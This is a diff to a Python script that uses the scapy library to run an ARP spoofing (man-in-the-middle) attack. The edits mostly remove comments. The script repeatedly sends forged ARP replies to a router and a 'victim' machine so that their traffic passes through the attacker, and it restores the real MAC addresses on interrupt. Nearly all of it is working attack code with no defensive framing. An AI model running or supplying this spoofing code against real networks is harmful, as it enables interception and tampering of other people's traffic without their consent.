@@ -4,7 +4,7 @@ import scapy.all as scapy
 
 def restore_defaults(dest, source):
     # getting the real MACs
-    target_mac = get_mac(dest) # 1st (router), then (windows)
+    target_mac = get_mac(dest)
     source_mac = get_mac(source)
     # creating the packet
     packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
@@ -24,13 +24,10 @@ def get_mac(ip):
     mac = answer[0][1].hwsrc
     return mac
 
-# we will send the packet to the target by pretending being the spoofed
 def spoofing(target, spoofed):
     # getting the MAC of the target
     mac = get_mac(target)
-    # generating the spoofed packet modifying the source and the target
     packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
-    # sending the packet
     scapy.send(packet, verbose=False)
 
 def main():
@@ -39,12 +36,12 @@ def main():
 
     try:
         while True:
-            spoofing(router_ip, victim_ip) # router (source, dest -> attacker machine)
-            spoofing(victim_ip, router_ip) # win PC
+            spoofing(router_ip, victim_ip)
+            spoofing(victim_ip, router_ip)
     except KeyboardInterrupt:
         print("[!] Proceso detenido. Restaurando valores predeterminados... por favor espera")
-        restore_defaults(router_ip, victim_ip) # router (source, dest -> attacker machine)
-        restore_defaults(victim_ip, router_ip) # win PC
+        restore_defaults(router_ip, victim_ip)
+        restore_defaults(victim_ip, router_ip)
         exit(0)
 
 if __name__ == "__main__":
